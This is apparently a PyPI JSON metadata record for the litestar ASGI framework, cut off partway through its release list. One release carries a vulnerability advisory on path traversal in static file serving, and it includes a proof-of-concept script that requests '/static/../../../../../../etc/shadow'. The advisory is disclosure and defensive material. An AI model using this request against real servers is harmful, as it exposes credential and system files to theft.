{"1.0.0a0":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://starliteproject.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,framework,websocket,starlite","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Documentation":"https://docs.starliteproject.dev/","Homepage":"https://starliteproject.dev/","Repository":"https://github.com/starlite-api/starlite"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/1.0.0a0/","requires_dist":["alembic ; extra == \"sqlalchemy\"","anyio (>=3)","attrs ; extra == \"attrs\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","pydantic","pydantic-factories","python-dateutil ; extra == \"attrs\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.4) ; extra == \"sqlalchemy\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions"],"requires_python":">=3.8,<4.0","summary":"Performant, light and flexible ASGI API Framework","version":"1.0.0a0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"c3d3c6160162057dda6c23f9abb9e0606cca2cc69357b4ce55fc16193a74e595","md5":"870bc747aeb4886fa4adfa715eed9abb","sha256":"a7033811965a01440a18ba7078b76baa5c2cb9b15634b7909f89dd27af3d09c4"},"downloads":-1,"filename":"litestar-1.0.0a0-py3-none-any.whl","has_sig":false,"md5_digest":"870bc747aeb4886fa4adfa715eed9abb","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":413173,"upload_time":"2023-04-01T10:24:34","upload_time_iso_8601":"2023-04-01T10:24:34.772196Z","url":"https://files.pythonhosted.org/packages/c3/d3/c6160162057dda6c23f9abb9e0606cca2cc69357b4ce55fc16193a74e595/litestar-1.0.0a0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"c7a6f135fd2df47accc01c96588c294a9269f723910fd2cff9e3b6ff67f131b1","md5":"637c5e93147134d1eeb29055330fa239","sha256":"b452dc13df1d4e04c81ab89776d6bdd79b14f90714e4cb2ba19c9f2c9987b0cd"},"downloads":-1,"filename":"litestar-1.0.0a0.tar.gz","has_sig":false,"md5_digest":"637c5e93147134d1eeb29055330fa239","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":301065,"upload_time":"2023-04-01T10:24:37","upload_time_iso_8601":"2023-04-01T10:24:37.991120Z","url":"https://files.pythonhosted.org/packages/c7/a6/f135fd2df47accc01c96588c294a9269f723910fd2cff9e3b6ff67f131b1/litestar-1.0.0a0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Framework :: AsyncIO","Framework :: Pydantic","Framework :: Pydantic :: 1","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,asgi,litestar,starlite","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","annotated-types ; extra == \"annotated-types\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers (>=1.0.2)","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4) ; extra == \"mako\" or extra == \"full\"","msgspec (>=0.17.0)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","piccolo ; extra == \"piccolo\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory (>=2.6.3)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic[email] ; extra == \"pydantic\" or extra == \"full\"","pydantic-extra-types ; extra == \"pydantic\" or extra == \"full\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,<4.5.0) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.0.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"746bfa090ee3145c536610dd330eccea498bea40b754ed76734946be49123ed8","md5":"8d265e5e5b5adb54bcde4fac20fe2626","sha256":"476255732832aaaec71ba62f7d534ebaa34ea98c6080c1d65fc1758bcd16ceeb"},"downloads":-1,"filename":"litestar-2.0.0-py3-none-any.whl","has_sig":false,"md5_digest":"8d265e5e5b5adb54bcde4fac20fe2626","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":471304,"upload_time":"2023-08-21T14:12:17","upload_time_iso_8601":"2023-08-21T14:12:17.035495Z","url":"https://files.pythonhosted.org/packages/74/6b/fa090ee3145c536610dd330eccea498bea40b754ed76734946be49123ed8/litestar-2.0.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8650268ed8a9b2684caba7d274868c9e14203946e32215038db79b8bc7125018","md5":"5155301e246b7ffb04d1422b686f5e16","sha256":"88f8b17e9406372fdef23531b1c77e1c597e791ff91c43d3177ef6822f9fd32e"},"downloads":-1,"filename":"litestar-2.0.0.tar.gz","has_sig":false,"md5_digest":"5155301e246b7ffb04d1422b686f5e16","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":334013,"upload_time":"2023-08-21T14:12:19","upload_time_iso_8601":"2023-08-21T14:12:19.184064Z","url":"https://files.pythonhosted.org/packages/86/50/268ed8a9b2684caba7d274868c9e14203946e32215038db79b8bc7125018/litestar-2.0.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.0.0a3":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Repository":"https://github.com/litestar-org/litestar"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0a3/","requires_dist":["alembic ; extra == \"sqlalchemy\"","anyio (>=3)","attrs ; extra == \"attrs\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory","pydantic (<2)","python-dateutil ; extra == \"attrs\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.4) ; extra == \"sqlalchemy\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions"],"requires_python":">=3.8,<4.0","summary":"Performant, light and flexible ASGI API Framework","version":"2.0.0a3","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"0ac7de3e2d498c5a2e836b98c3e0ecc08f3edd7057d7e8b180e64a1625d559f2","md5":"7eb1c14bdb6a0a899a9e9b8e7bc7785b","sha256":"b819a8972096fba01e00410dd5baff278ad01526e1783aca2ea97ee009ce3c95"},"downloads":-1,"filename":"litestar-2.0.0a3-py3-none-any.whl","has_sig":false,"md5_digest":"7eb1c14bdb6a0a899a9e9b8e7bc7785b","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":418294,"upload_time":"2023-04-07T17:38:44","upload_time_iso_8601":"2023-04-07T17:38:44.598016Z","url":"https://files.pythonhosted.org/packages/0a/c7/de3e2d498c5a2e836b98c3e0ecc08f3edd7057d7e8b180e64a1625d559f2/litestar-2.0.0a3-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"fbf30ee3c15ad537d7b1ceea0785b374f9e41dbe43cfba0267949db99bd98114","md5":"2fc24b655928f5bfd073acc1a1e290db","sha256":"8658ef47d5f411c257cf962f7a76ca46066e85083e0a5aef9990550bd06e8b87"},"downloads":-1,"filename":"litestar-2.0.0a3.tar.gz","has_sig":false,"md5_digest":"2fc24b655928f5bfd073acc1a1e290db","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":302017,"upload_time":"2023-04-07T17:38:46","upload_time_iso_8601":"2023-04-07T17:38:46.594981Z","url":"https://files.pythonhosted.org/packages/fb/f3/0ee3c15ad537d7b1ceea0785b374f9e41dbe43cfba0267949db99bd98114/litestar-2.0.0a3.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0a4":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Repository":"https://github.com/litestar-org/litestar"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0a4/","requires_dist":["alembic ; extra == \"sqlalchemy\"","anyio (>=3)","attrs ; extra == \"attrs\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory (>=2.0.0a1)","pydantic (<2)","python-dateutil ; extra == \"attrs\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.4) ; extra == \"sqlalchemy\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions"],"requires_python":">=3.8,<4.0","summary":"Performant, light and flexible ASGI API Framework","version":"2.0.0a4","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"6798aac367a52f4254591e4b3e2fbd1a6c857cc052a47f7083757f44d28c1803","md5":"3a196310c44781c6ac10cbb0e286e70b","sha256":"cf6dfeeae170329005c62ab6a5cbdff6ffafe0f9528caf4f201fd93571e7e63b"},"downloads":-1,"filename":"litestar-2.0.0a4-py3-none-any.whl","has_sig":false,"md5_digest":"3a196310c44781c6ac10cbb0e286e70b","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":419155,"upload_time":"2023-04-11T16:10:22","upload_time_iso_8601":"2023-04-11T16:10:22.766123Z","url":"https://files.pythonhosted.org/packages/67/98/aac367a52f4254591e4b3e2fbd1a6c857cc052a47f7083757f44d28c1803/litestar-2.0.0a4-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e3d2b6153beff91acc9441cd0fbabd32b1ce3f06900072da093393ec444d1046","md5":"422466ffaae67d4c912d5de777128e6c","sha256":"5bf9533e2233244d0001d95e941138db6712a787c52185161ea814db5077ac02"},"downloads":-1,"filename":"litestar-2.0.0a4.tar.gz","has_sig":false,"md5_digest":"422466ffaae67d4c912d5de777128e6c","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":302656,"upload_time":"2023-04-11T16:10:24","upload_time_iso_8601":"2023-04-11T16:10:24.893737Z","url":"https://files.pythonhosted.org/packages/e3/d2/b6153beff91acc9441cd0fbabd32b1ce3f06900072da093393ec444d1046/litestar-2.0.0a4.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0a5":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Repository":"https://github.com/litestar-org/litestar"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0a5/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","cattrs ; extra == \"attrs\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4)","msgspec","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","picologging ; extra == \"picologging\"","polyfactory (>=2)","pydantic (<2)","python-dateutil ; extra == \"attrs\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pytimeparse ; extra == \"attrs\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,!=4.5.0,!=4.5.1,!=4.5.2,!=4.5.3) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.4) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.21.1,<0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Performant, light and flexible ASGI API Framework","version":"2.0.0a5","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"4faf42927888177d6511010dc2e85ef64928358a8fd1437c18c9c5f27148161e","md5":"8b32f407bb8d1291c4988ae1c7b974cc","sha256":"ee3d332135cb0398c8b01aad64e7c149d3122938e341f76997b3cd7a7f11bad0"},"downloads":-1,"filename":"litestar-2.0.0a5-py3-none-any.whl","has_sig":false,"md5_digest":"8b32f407bb8d1291c4988ae1c7b974cc","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":430747,"upload_time":"2023-04-26T13:41:27","upload_time_iso_8601":"2023-04-26T13:41:27.664972Z","url":"https://files.pythonhosted.org/packages/4f/af/42927888177d6511010dc2e85ef64928358a8fd1437c18c9c5f27148161e/litestar-2.0.0a5-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"a2fc541c217260e9cfbeacff4949a51a926bd5615a09d9cf58d77f37eea90461","md5":"b48eb13d0c593249895450822ccf0522","sha256":"1e22b72219e468d3cabd9b5800461fa3e4c2b5c5a1b515616f4cfd81ad186f1b"},"downloads":-1,"filename":"litestar-2.0.0a5.tar.gz","has_sig":false,"md5_digest":"b48eb13d0c593249895450822ccf0522","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":307171,"upload_time":"2023-04-26T13:41:29","upload_time_iso_8601":"2023-04-26T13:41:29.593929Z","url":"https://files.pythonhosted.org/packages/a2/fc/541c217260e9cfbeacff4949a51a926bd5615a09d9cf58d77f37eea90461/litestar-2.0.0a5.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.0a6":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet :: WWW/HTTP","Topic :: Software Development","Topic :: Software Development :: Libraries","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,http,asgi,pydantic,litestar,starlite,framework,websocket,litestar","license":"MIT","maintainer":"Na'aman 